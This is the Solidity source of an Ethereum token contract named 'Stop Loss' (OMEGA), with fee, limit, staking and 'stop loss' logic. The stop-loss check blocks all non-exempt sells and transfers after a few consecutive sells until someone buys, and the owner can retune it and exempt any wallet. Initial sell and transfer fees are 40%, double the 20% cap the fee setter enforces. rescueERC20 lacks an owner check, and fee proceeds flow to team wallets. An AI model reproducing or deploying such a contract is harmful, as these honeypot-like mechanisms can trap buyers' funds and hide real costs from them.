1 /**
2 
3 https://t.me/StopLossOmega
4 https://stoplosscoin.com/
5 https://twitter.com/StopLossOmega
6 
7 */
8 
9 // SPDX-License-Identifier: MIT
10 
11 pragma solidity 0.8.19;
12 
13 
14 library SafeMath {
15     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
16     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
17     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
18     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
19     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
20     
21     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
22         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
23 
24     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
25         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
26 
27     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
28         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
29         if(c / a != b) return(false, 0); return(true, c);}}
30 
31     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
32         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
33 
34     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
35         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
36 
37     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
38         unchecked{require(b <= a, errorMessage); return a - b;}}
39 
40     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
41         unchecked{require(b > 0, errorMessage); return a / b;}}
42 
43     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
44         unchecked{require(b > 0, errorMessage); return a % b;}}}
45 
46 interface IERC20 {
47     function totalSupply() external view returns (uint256);
48     function circulatingSupply() external view returns (uint256);
49     function decimals() external view returns (uint8);
50     function symbol() external view returns (string memory);
51     function name() external view returns (string memory);
52     function getOwner() external view returns (address);
53     function balanceOf(address account) external view returns (uint256);
54     function transfer(address recipient, uint256 amount) external returns (bool);
55     function allowance(address _owner, address spender) external view returns (uint256);
56     function approve(address spender, uint256 amount) external returns (bool);
57     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
58     event Transfer(address indexed from, address indexed to, uint256 value);
59     event Approval(address indexed owner, address indexed spender, uint256 value);}
60 
61 abstract contract Ownable {
62     address internal owner;
63     constructor(address _owner) {owner = _owner;}
64     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
65     function isOwner(address account) public view returns (bool) {return account == owner;}
66     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
67     event OwnershipTransferred(address owner);
68 }
69 
70 interface stakeIntegration {
71     function stakingWithdraw(address depositor, uint256 _amount) external;
72     function stakingDeposit(address depositor, uint256 _amount) external;
73 }
74 
75 interface tokenStaking {
76     function deposit(uint256 amount) external;
77     function withdraw(uint256 amount) external;
78 }
79 
80 interface IFactory{
81     function createPair(address tokenA, address tokenB) external returns (address pair);
82     function getPair(address tokenA, address tokenB) external view returns (address pair);
83 }
84 
85 interface IRouter {
86     function factory() external pure returns (address);
87     function WETH() external pure returns (address);
88     
89     function addLiquidityETH(
90         address token,
91         uint amountTokenDesired,
92         uint amountTokenMin,
93         uint amountETHMin,
94         address to,
95         uint deadline
96     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
97 
98     function swapExactTokensForETHSupportingFeeOnTransferTokens(
99         uint amountIn,
100         uint amountOutMin,
101         address[] calldata path,
102         address to,
103         uint deadline) external;
104 }
105 
106 contract StopLoss is IERC20, tokenStaking, Ownable {
107     using SafeMath for uint256;
108     string private constant _name = 'Stop Loss';
109     string private constant _symbol = 'OMEGA';
110     uint8 private constant _decimals = 9;
111     uint256 private _totalSupply = 1000000 * (10 ** _decimals);
112     uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
113     uint256 public _maxSellAmount = ( _totalSupply * 150 ) / 10000;
114     uint256 public _maxWalletToken = ( _totalSupply * 150 ) / 10000;
115     mapping (address => uint256) _balances;
116     mapping (address => mapping (address => uint256)) private _allowances;
117     mapping(address => bool) private isFeeExempt;
118     IRouter router;
119     address public pair;
120     uint256 private liquidityFee = 0;
121     uint256 private marketingFee = 200;
122     uint256 private developmentFee = 200;
123     uint256 private stakingFee = 0;
124     uint256 private tokenFee = 0;
125     uint256 private totalFee = 2000;
126     uint256 private sellFee = 4000;
127     uint256 private transferFee = 4000;
128     uint256 private denominator = 10000;
129     bool private swapEnabled = true;
130     bool private tradingAllowed = false;
131     bool public stopLoss = true;
132     uint256 public stopLossSells;
133     uint256 public stopLossTrigger = 3;
134     bool public stopLossBuyNeeded = false;
135     uint256 private swapTimes;
136     bool private swapping;
137     uint256 private swapAmount = 3;
138     uint256 private swapThreshold = ( _totalSupply * 500 ) / 100000;
139     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
140     uint256 public stopLossMinAmount = 1;
141     modifier lockTheSwap {swapping = true; _; swapping = false;}
142     mapping(address => uint256) public amountStaked;
143     uint256 public totalStaked;
144     stakeIntegration internal stakingContract;
145     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
146     address internal development_receiver = 0xe04F1a8F668610d4380EC8E08FcfA38dBD61922e; 
147     address internal marketing_receiver = 0x8f694B55D0F9A7cCaBc4CFb030aef7DDcf5cC52a;
148     address internal liquidity_receiver = 0xe04F1a8F668610d4380EC8E08FcfA38dBD61922e;
149     address internal staking_receiver = 0xe04F1a8F668610d4380EC8E08FcfA38dBD61922e;
150     address internal token_receiver = 0x000000000000000000000000000000000000dEaD;
151     
152     event Deposit(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
153     event Withdraw(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
154     event SetStakingAddress(address indexed stakingAddress, uint256 indexed timestamp);
155     event TradingEnabled(address indexed account, uint256 indexed timestamp);
156     event ExcludeFromFees(address indexed account, bool indexed isExcluded, uint256 indexed timestamp);
157     event SetDividendExempt(address indexed account, bool indexed isExempt, uint256 indexed timestamp);
158     event Launch(uint256 indexed whitelistTime, bool indexed whitelistAllowed, uint256 indexed timestamp);
159     event SetInternalAddresses(address indexed marketing, address indexed liquidity, address indexed development, uint256 timestamp);
160     event SetSwapBackSettings(uint256 indexed swapAmount, uint256 indexed swapThreshold, uint256 indexed swapMinAmount, uint256 timestamp);
161     event SetDistributionCriteria(uint256 indexed minPeriod, uint256 indexed minDistribution, uint256 indexed distributorGas, uint256 timestamp);
162     event SetParameters(uint256 indexed maxTxAmount, uint256 indexed maxWalletToken, uint256 indexed maxTransfer, uint256 timestamp);
163     event SetStructure(uint256 indexed total, uint256 indexed sell, uint256 transfer, uint256 indexed timestamp);
164     event CreateLiquidity(uint256 indexed tokenAmount, uint256 indexed ETHAmount, address indexed wallet, uint256 timestamp);
165 
166     constructor() Ownable(msg.sender) {
167         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
168         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
169         router = _router;
170         pair = _pair;
171         isFeeExempt[address(this)] = true;
172         isFeeExempt[liquidity_receiver] = true;
173         isFeeExempt[marketing_receiver] = true;
174         isFeeExempt[development_receiver] = true;
175         isFeeExempt[address(DEAD)] = true;
176         isFeeExempt[msg.sender] = true;
177         _balances[msg.sender] = _totalSupply;
178         emit Transfer(address(0), msg.sender, _totalSupply);
179     }
180 
181     receive() external payable {}
182     function name() public pure returns (string memory) {return _name;}
183     function symbol() public pure returns (string memory) {return _symbol;}
184     function decimals() public pure returns (uint8) {return _decimals;}
185     function getOwner() external view override returns (address) { return owner; }
186     function totalSupply() public view override returns (uint256) {return _totalSupply;}
187     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
188     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
189     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
190     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
191     function availableBalance(address wallet) public view returns (uint256) {return _balances[wallet].sub(amountStaked[wallet]);}
192     function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
193 
194     function preTxCheck(address sender, address recipient, uint256 amount) internal view {
195         require(sender != address(0), "ERC20: transfer from the zero address");
196         require(recipient != address(0), "ERC20: transfer to the zero address");
197         require(amount <= balanceOf(sender),"ERC20: below available balance threshold");
198     }
199 
200     function _transfer(address sender, address recipient, uint256 amount) private {
201         preTxCheck(sender, recipient, amount);
202         checkTradingAllowed(sender, recipient);
203         checkTxLimit(sender, recipient, amount);
204         checkMaxWallet(sender, recipient, amount);
205         checkStopLoss(sender, recipient, amount);
206         swapbackCounters(sender, recipient, amount);
207         swapBack(sender, recipient);
208         _balances[sender] = _balances[sender].sub(amount);
209         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
210         _balances[recipient] = _balances[recipient].add(amountReceived);
211         emit Transfer(sender, recipient, amountReceived);
212     }
213 
214     function deposit(uint256 amount) override external {
215         require(amount <= _balances[msg.sender].sub(amountStaked[msg.sender]), "ERC20: Cannot stake more than available balance");
216         stakingContract.stakingDeposit(msg.sender, amount);
217         amountStaked[msg.sender] = amountStaked[msg.sender].add(amount);
218         totalStaked = totalStaked.add(amount);
219         emit Deposit(msg.sender, amount, block.timestamp);
220     }
221 
222     function withdraw(uint256 amount) override external {
223         require(amount <= amountStaked[msg.sender], "ERC20: Cannot unstake more than amount staked");
224         stakingContract.stakingWithdraw(msg.sender, amount);
225         amountStaked[msg.sender] = amountStaked[msg.sender].sub(amount);
226         totalStaked = totalStaked.sub(amount);
227         emit Withdraw(msg.sender, amount, block.timestamp);
228     }
229 
230     function setStakingAddress(address _staking) external onlyOwner {
231         stakingContract = stakeIntegration(_staking); isFeeExempt[_staking] = true;
232         emit SetStakingAddress(_staking, block.timestamp);
233     }
234 
235     function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _token, uint256 _development, uint256 _staking, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
236         liquidityFee = _liquidity; marketingFee = _marketing; tokenFee = _token; stakingFee = _staking;
237         developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
238         require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "ERC20: fees cannot be more than 20%");
239         emit SetStructure(_total, _sell, _trans, block.timestamp);
240     }
241 
242     function setParameters(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
243         uint256 newTx = (totalSupply().mul(_buy)).div(uint256(10000)); uint256 newTransfer = (totalSupply().mul(_trans)).div(uint256(10000));
244         uint256 newWallet = (totalSupply().mul(_wallet)).div(uint256(10000)); uint256 limit = totalSupply().mul(5).div(1000);
245         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "ERC20: max TXs and max Wallet cannot be less than .5%");
246         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
247         emit SetParameters(newTx, newWallet, newTransfer, block.timestamp);
248     }
249 
250     function checkTradingAllowed(address sender, address recipient) internal view {
251         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}
252     }
253 
254     function checkStopLoss(address sender, address recipient, uint256 amount) internal {
255         if(stopLoss && !swapping){ 
256         if(recipient == pair && !isFeeExempt[sender]){stopLossSells = stopLossSells.add(uint256(1));}
257         if(sender == pair && !isFeeExempt[recipient] && amount >= stopLossMinAmount){stopLossSells = uint256(0);}
258         if(stopLossSells > stopLossTrigger){stopLossBuyNeeded = true;}
259         if(stopLossBuyNeeded && !isFeeExempt[recipient] && !isFeeExempt[sender]){
260             require(sender == pair, "ERC20: StopLoss purchase required"); if(amount >= stopLossMinAmount){stopLossSells = uint256(0); stopLossBuyNeeded = false;}}}
261     }
262 
263     function setStopLoss(bool enabled, uint256 trigger, uint256 minAmount) external onlyOwner {
264         stopLoss = enabled; stopLossTrigger = trigger; stopLossMinAmount = minAmount;
265     }
266 
267     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
268         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
269             require((_balances[recipient].add(amount)) <= _maxWalletToken, "ERC20: exceeds maximum wallet amount.");}
270     }
271 
272     function swapbackCounters(address sender, address recipient, uint256 amount) internal {
273         if(recipient == pair && !isFeeExempt[sender] && amount >= minTokenAmount){swapTimes += uint256(1);}
274     }
275 
276     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
277         if(amountStaked[sender] > uint256(0)){require((amount.add(amountStaked[sender])) <= _balances[sender], "ERC20: exceeds maximum allowed not currently staked.");}
278         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "ERC20: tx limit exceeded");}
279         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "ERC20: tx limit exceeded");
280     }
281 
282     function swapAndLiquify(uint256 tokens) private lockTheSwap {
283         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee).add(stakingFee)).mul(2);
284         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
285         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
286         uint256 initialBalance = address(this).balance;
287         swapTokensForETH(toSwap);
288         uint256 deltaBalance = address(this).balance.sub(initialBalance);
289         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
290         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
291         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith, liquidity_receiver); }
292         uint256 marketingAmount = unitBalance.mul(2).mul(marketingFee);
293         if(marketingAmount > 0){payable(marketing_receiver).transfer(marketingAmount);}
294         uint256 stakingAmount = unitBalance.mul(2).mul(stakingFee);
295         if(stakingAmount > 0){payable(staking_receiver).transfer(stakingAmount);}
296         if(address(this).balance > uint256(0)){payable(development_receiver).transfer(address(this).balance);}
297     }
298 
299     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount, address receiver) private {
300         _approve(address(this), address(router), tokenAmount);
301         router.addLiquidityETH{value: ETHAmount}(
302             address(this),
303             tokenAmount,
304             0,
305             0,
306             address(receiver),
307             block.timestamp);
308     }
309 
310     function swapTokensForETH(uint256 tokenAmount) private {
311         address[] memory path = new address[](2);
312         path[0] = address(this);
313         path[1] = router.WETH();
314         _approve(address(this), address(router), tokenAmount);
315         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
316             tokenAmount,
317             0,
318             path,
319             address(this),
320             block.timestamp);
321     }
322 
323     function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
324         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
325         return !swapping && swapEnabled && tradingAllowed && !isFeeExempt[sender] 
326             && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
327     }
328 
329     function swapBack(address sender, address recipient) internal {
330         if(shouldSwapBack(sender, recipient)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
331     }
332     
333     function startTrading() external onlyOwner {
334         tradingAllowed = true;
335         emit TradingEnabled(msg.sender, block.timestamp);
336     }
337 
338     function setInternalAddresses(address _marketing, address _liquidity, address _development, address _staking, address _token) external onlyOwner {
339         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development; staking_receiver = _staking; token_receiver = _token;
340         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_staking] = true; isFeeExempt[_token] = true;
341         emit SetInternalAddresses(_marketing, _liquidity, _development, block.timestamp);
342     }
343 
344     function setisExempt(address _address, bool _enabled) external onlyOwner {
345         isFeeExempt[_address] = _enabled;
346         emit ExcludeFromFees(_address, _enabled, block.timestamp);
347     }
348 
349     function rescueERC20(address _address, uint256 _amount) external {
350         IERC20(_address).transfer(development_receiver, _amount);
351     }
352 
353     function setSwapbackSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
354         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
355         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
356         emit SetSwapBackSettings(_swapAmount, _swapThreshold, _minTokenAmount, block.timestamp);  
357     }
358 
359     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
360         return !isFeeExempt[sender] && !isFeeExempt[recipient];
361     }
362 
363     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
364         if(recipient == pair){return sellFee;}
365         if(sender == pair){return totalFee;}
366         return transferFee;
367     }
368 
369     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
370         if(getTotalFee(sender, recipient) > 0){
371         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
372         _balances[address(this)] = _balances[address(this)].add(feeAmount);
373         emit Transfer(sender, address(this), feeAmount);
374         if(tokenFee > uint256(0)){_transfer(address(this), address(token_receiver), amount.div(denominator).mul(tokenFee));}
375         return amount.sub(feeAmount);} return amount;
376     }
377 
378     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
379         _transfer(sender, recipient, amount);
380         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
381         return true;
382     }
383 
384     function _approve(address owner, address spender, uint256 amount) private {
385         require(owner != address(0), "ERC20: approve from the zero address");
386         require(spender != address(0), "ERC20: approve to the zero address");
387         _allowances[owner][spender] = amount;
388         emit Approval(owner, spender, amount);
389     }
390 }